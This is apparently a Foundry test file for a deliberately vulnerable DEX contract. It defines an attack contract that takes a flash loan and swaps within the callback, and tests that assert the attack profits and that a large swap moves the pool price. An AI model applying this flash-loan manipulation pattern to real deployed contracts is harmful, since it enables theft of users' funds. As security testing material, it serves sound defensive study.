// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/VulnerableDODOPool.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;

    constructor(uint256 initialSupply) {
        balanceOf[msg.sender] = initialSupply;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract AttackContract {
    SimpleDEX public dex;
    MockERC20 public tokenA;
    MockERC20 public tokenB;

    constructor(SimpleDEX _dex, MockERC20 _tokenA, MockERC20 _tokenB) {
        dex = _dex;
        tokenA = _tokenA;
        tokenB = _tokenB;
    }

    function executeOperation(address token, uint256 amount) external {
        if (token == address(tokenA)) {
            dex.swap(address(tokenA), address(tokenB), amount);
        }
    }

    function startAttack() external {
        dex.flashLoan(address(tokenA), 1000 ether);
    }
}

contract DEXTest is Test {
    SimpleDEX public dex;
    MockERC20 public tokenA;
    MockERC20 public tokenB;
    AttackContract public attacker;

    function setUp() public {
        tokenA = new MockERC20(10000 ether);
        tokenB = new MockERC20(10000 ether);
        dex = new SimpleDEX();

        require(tokenA.transfer(address(dex), 1000 ether));
        require(tokenB.transfer(address(dex), 1000 ether));

        dex.addLiquidity(address(tokenA), address(tokenB), 1000 ether, 1000 ether);
    }

    function testFlashLoanAttack() public {
        attacker = new AttackContract(dex, tokenA, tokenB);

        uint256 initialBalance = tokenB.balanceOf(address(attacker));

        attacker.startAttack();

        uint256 finalBalance = tokenB.balanceOf(address(attacker));

        assertTrue(finalBalance > initialBalance, "Attack should profit");
    }

    function testPriceManipulation() public {
        uint256 priceBefore = dex.calculateOut(address(tokenA), address(tokenB), 1 ether);
        console.log("Price before manipulation:", priceBefore);

        require(tokenA.transfer(address(dex), 500 ether), "Transfer to DEX failed");
        dex.swap(address(tokenA), address(tokenB), 500 ether);

        uint256 priceAfter = dex.calculateOut(address(tokenA), address(tokenB), 1 ether);
        console.log("Price after manipulation:", priceAfter);

        assertTrue(priceAfter != priceBefore, "Price should change after large swap");
    }
}
